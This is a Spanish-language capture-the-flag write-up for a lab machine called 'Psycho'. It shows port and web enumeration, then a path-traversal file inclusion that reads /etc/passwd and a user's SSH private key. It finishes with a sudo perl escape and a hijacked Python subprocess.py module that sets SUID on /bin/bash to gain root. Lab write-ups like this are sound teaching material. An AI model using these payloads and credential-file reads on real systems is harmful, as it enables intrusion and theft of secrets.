# Psycho
> Dificultad: Fácil

___

#### FASE RECOPILACIÓN:  

Primero, buscamos los puertos, servicios y versiones con nmap:  

 `nmap -n -v -sV -sC --min-rate 5000 <IP>`  

[IMG]  

 Vemos que está abierto el puerto 80, el cual habla de una web-app. Una vez aclarado esto, proseguimos con una Enumeración Web usando, en este caso, `wfuzz`:  

 `wfuzz -c --hc 404 -t 200 -z file,<diccionario> -u "http://<IP>/FUZZ"`  

 Los más importante que aparece es el `index.php`. Entonces, dado que no hay más, proseguimos con fuzzear por Parámetros URL en dicho recurso con `wfuzz` nuevamente:  
 
 `wfuzz -c --hc 404 -t 200 -z file,rockyou.txt -u "http://<IP>/index.html?FUZZ=1"`  

Entramos a `secret`.  

#### FASE EXPLOTACIÓN:  

Bien, probando y probando, encotramos que podemos intentar un LFI en dicho parámetro. Queda:  

`wfuzz -c --hc 404 -t 200 -z list,"../../../../../etc/passwd" -u http://<IP>/index.php?secret=FUZZ"`  

o directamente en el navegador:  

`http://<IP>/index.php?secret=../../../../../etc/passwd`  

Bien, conseguimos leer el archivo `/etc/passwd` con lo cual podemos Enumerar Usuarios. Encontramos a `luisillo`, `ubuntu` y `vaxei`.  

Bien, de la misma manera que leimos `/etc/passwd` podemos seguir buscando otros ficheros importantes del sistema, como por ejemplo, `http://<IP>/index.php?secret=../../../../../../../home/vaxei/.ssh/id_rsa`. Mediante el mismo, podemos tener acceso a la Clave Privada del usuario `vaxei`, por lo cual ya podemos tener acceso al sistema:  

Copiamos dicha clave localmente e intentamos `ssh -i id_rsa vaxei@<IP>`. Hacemos `whoami`. Tenemos acceso.  

#### FASE POST-EXPLOTACIÓN (Escalar Privilegios):  

Una de las primeras cosas que debemos hacer cuando ya tenemos un pie adentro es ver los **Privilegios Sudo**:  

`sudo -l`  

El resultado nos dice que podemos usar `perl` como `luisillo` para convertirmos en él. Vamos a la web https://gtfobins.github.io/ y encontramos que corriendo: `sudo -u luisillo perl -e 'exec "/bin/bash";'`. Somos `luisillo`.  

Chequeando los Privilegios Sudo con este usuario,vemos que los tenemos sobre un script en particular:  `/opt/paw.py`  

Al correr dicho script con `python3 /opt/paw.py` vemos que lanza un error al no encontrar la librería `/usr/lib/python3.12/subprocess.py`. Gracias al mismo, nos damos cuenta que podemos crear nuestro propio fichero malicioso que sea llamado por el script, ya que al ser un script primero busca en su propio nivel, es decir en el directorio que lo contiene.  

Con esto en mente, creamos un `subprocess.py` malicioso en `/opt` con este código, por ejemplo:  

`cd /opt && nano subprocess.py` 

```
#!/bin/usr/env python3
import os;
os.system("chmod u+s /bin/bash");
```  

Le damos permisos de ejecutable con `chmod +x subprocess.py`.

El mismo le da permisos SUID a /bin/bash en caso de ser root y, como tenemos permisos sudo sobre el script `/opt/paw.py`, tendríamos éxito.  

Lanzamos el siguiente comando `sudo python3 /opt/paw.py` y lanza un error sin importancia.  Corremos ahora `bash -p` y somos root. Eso es todo.  

